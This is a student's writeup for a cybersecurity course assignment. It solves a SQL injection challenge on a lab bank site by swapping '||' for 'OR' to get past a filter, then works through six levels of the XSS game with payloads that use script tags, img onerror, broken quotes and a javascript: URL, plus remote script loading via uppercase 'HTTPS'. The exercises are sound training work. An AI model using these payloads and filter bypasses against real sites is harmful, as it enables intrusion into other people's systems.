# Crypto II Writeup

Name: Lawrence Byun
Section: 0101

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Lawrence Byun

## Assignment Writeup

### Part 1 (40 Pts)
When going to all the links I noticed the URL gave something like SQL. When I tried ```http://1337bank.money:5000/item?id=2' or '1'='1 ``` I got the message ``` ERROR: ATTEMPTED SQL INJECTION DETECTED ``` 
After some Googling I found that you could use ```||``` instead of ```OR```. So I tried  ``` http://1337bank.money:5000/item?id=2' || '1'='1 ``` and got the flag 

CMSC389R-{y0u_ar3_th3_SQ1_ninj@}


### Part 2 (60 Pts)


Level 1: 
They gave an vulnerable input field. I entered ``` <script> alert("Hello") </script> ```

Level 2: 
Googled ```html onerror``` attribute. Entered ```<img src = "nothing.jpg" onerror = alert("Hello")>``` into the message box and posted. Cannot load the img so it executes the javascript.

Level 3: 
Looked at the source code. Broke the quotes in the img tag so it would read ```<img src='/static/level3/cloud3'.jpg' />``` instead of ```<img src='/static/level3/cloud3.jpg' />``` like they wanted. Used the onerror attribute from the previous to make the img tag execute javascript. 
Entered ```' onerror = 'alert("Heelo")'``` into the URL.  ```https://xss-game.appspot.com/level3/frame#3' onerror = 'alert("Heelo")'```	

Level 4: 
Look at the hints. Saw that the startTimer function was being called from img tag. Tried to casue an error in the img tag so it would execute onerror

```'); onerror = alert('hello```

Level 5: 
On signup page ```https://xss-game.appspot.com/level5/frame/signup?next=confirm``` next is set to confirm. 
In signup.html next is used in the a href. You can execute Javascript in a href by using ```<a href="javascript:alert('Hello');">```

Go to the URL ```https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('Hello')``` and click next

Level 6: 
Hosted my code on pastepin. https://pastebin.com/raw/6W7W8kQJ
Tried loading a file. Got the error saying I cannot load URL containing "https". So I tired "HTTPS". 
```https://xss-game.appspot.com/level6/frame#HTTPS://pastebin.com/raw/6W7W8kQJ```